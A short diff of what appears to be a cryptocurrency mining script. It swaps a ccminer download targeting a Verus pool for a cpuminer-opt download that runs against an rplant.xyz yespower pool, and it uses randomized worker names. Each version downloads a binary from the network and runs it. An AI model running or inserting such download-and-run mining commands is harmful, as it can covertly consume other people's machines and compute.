@@ -1,7 +1,3 @@
-sudo apt-get install libjansson4 
-
-wget https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04 
-
-chmod +x ccminer_3_7_ubuntu_18.04 
-
-./ccminer_3_7_ubuntu_18.04 -a verus  -o stratum+tcp://eu.luckpool.net:3956 -u RNikpsudnFbs3zWURNBmUuiTxdHtwDNnkF.$(echo $(shuf -i 1-99 -n 1)-GASPOLL) -p -x -t 90
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz 
+tar xf cpuminer-opt-linux.tar.gz  
+./cpuminer-avx2 -a yespower  -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.$(echo $(shuf -i 1-999 -n 1)-TES) -t 7
